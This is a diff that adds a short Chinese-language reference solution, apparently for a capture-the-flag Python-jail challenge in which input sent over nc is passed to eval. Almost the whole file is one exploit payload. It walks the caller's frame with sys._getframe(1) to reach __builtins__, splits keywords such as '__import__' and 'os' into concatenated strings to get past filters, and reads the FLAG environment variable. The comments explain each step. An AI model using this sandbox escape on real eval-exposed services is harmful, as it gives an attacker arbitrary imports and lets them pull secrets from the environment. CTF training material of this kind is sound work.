@@ -1,0 +1,5 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+# _getframe(1) 是 handle 的帧，f_globals 即模块级命名空间；
+# 其 __builtins__ 是 module，用 __dict__ 下标挖导入器
+sys._getframe(1).f_globals['__bu'+'iltins__'].__dict__['__i'+'mport__']('o'+'s').__dict__['envi'+'ron']['F'+'LAG']
